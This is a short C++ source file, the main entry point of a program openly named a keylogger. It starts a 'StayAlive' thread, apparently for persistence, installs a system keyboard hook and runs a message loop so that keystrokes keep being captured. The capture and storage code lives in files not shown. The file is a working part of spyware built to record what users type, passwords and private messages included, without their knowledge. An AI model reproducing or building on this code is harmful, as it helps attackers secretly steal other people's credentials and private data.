#include "Keylogger.h"
#include "..\Tools.hpp"
#include "..\Constants.h"
#include "..\Debugger.h"

int __cdecl main(int argc, char **argv)
{
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&StayAlive, KEYLOGGER_APP_NAME, 0, NULL);
	if (!hThread)
	{
		PrintError(TEXT("CreateThread"), GetLastError());

		system("pause");
		return 1;
	}

	if (!SetKeyboardHook())
	{
		CloseHandle(hThread);

		system("pause");
		return 1;
	}

	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0u, 0u));

	if (!CloseHandle(hThread))
		PrintError(TEXT("CloseHandle"), GetLastError());

	system("pause");
	return 0;
}

